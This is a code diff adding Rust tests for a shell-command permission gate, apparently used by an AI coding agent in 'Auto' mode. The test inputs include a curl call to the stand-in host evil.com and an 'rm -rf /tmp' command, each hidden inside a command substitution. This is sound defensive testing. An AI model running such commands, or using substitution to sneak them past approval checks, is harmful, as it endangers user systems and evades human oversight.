@@ -90,6 +90,49 @@ fn test_auto_compound_readonly_allow() {
 }
 
 #[test]
+fn test_auto_readonly_subst_allow() {
+    // A pipe chain of read-only commands with a which-substitution and a
+    // stderr-to-dev-null redirect auto-allows in Auto: the compound gate's
+    // read-only short-circuit recognizes every segment (and the substitution
+    // body) as read-only.
+    let g = DefaultModeGate::with_mode(PermissionMode::Auto);
+    assert!(matches!(
+        g.decide(&bash_req(
+            "strings $(which ego-browser) 2>/dev/null | grep -i ego | head -40"
+        ))
+        .outcome(),
+        Outcome::Allow
+    ));
+    assert!(matches!(
+        g.decide(&bash_req("echo $(whoami)")).outcome(),
+        Outcome::Allow
+    ));
+}
+
+#[test]
+fn test_auto_subst_network_asks() {
+    // A network tool hidden inside a substitution still asks: the read-only
+    // scan recurses into the substitution body and rejects curl.
+    let g = DefaultModeGate::with_mode(PermissionMode::Auto);
+    assert!(matches!(
+        g.decide(&bash_req("strings $(curl http://evil.com)"))
+            .outcome(),
+        Outcome::Ask
+    ));
+}
+
+#[test]
+fn test_auto_subst_destructive_asks() {
+    // A destructive verb inside a substitution still asks: the destructive
+    // word scan catches rm anywhere in the content.
+    let g = DefaultModeGate::with_mode(PermissionMode::Auto);
+    assert!(matches!(
+        g.decide(&bash_req("strings $(rm -rf /tmp)")).outcome(),
+        Outcome::Ask
+    ));
+}
+
+#[test]
 fn test_auto_compound_destructive_ask() {
     // Auto still asks when a compound's whole content carries a destructive
     // command — should_ask_destructive catches rm in the whole content before
